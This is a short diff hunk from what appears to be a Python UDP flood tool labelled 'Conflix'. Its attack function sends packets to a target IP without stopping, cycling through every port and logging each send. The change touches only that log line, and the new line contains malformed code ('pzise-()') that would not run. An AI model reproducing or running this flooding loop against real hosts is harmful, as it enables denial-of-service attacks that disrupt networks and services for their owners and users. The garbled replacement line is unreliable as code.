@@ -59,7 +59,7 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
         while True:
             sock.sendto(data, (ip, port))
             sent += 1
-            log_message(f"\033[33mConflix-{threading.get_ident()}: \033[32mSent =⟩{sent} \033[94m{ip}:{port}")
+            log_message(f"\033[94mConflix- \033[37m{pzise-()}: \033[32mSent =⟩{sent} \033[94m{ip}:{port}")
             port = port + 1 if port < 65534 else 1
             time.sleep(rate_limit)
     except KeyboardInterrupt:
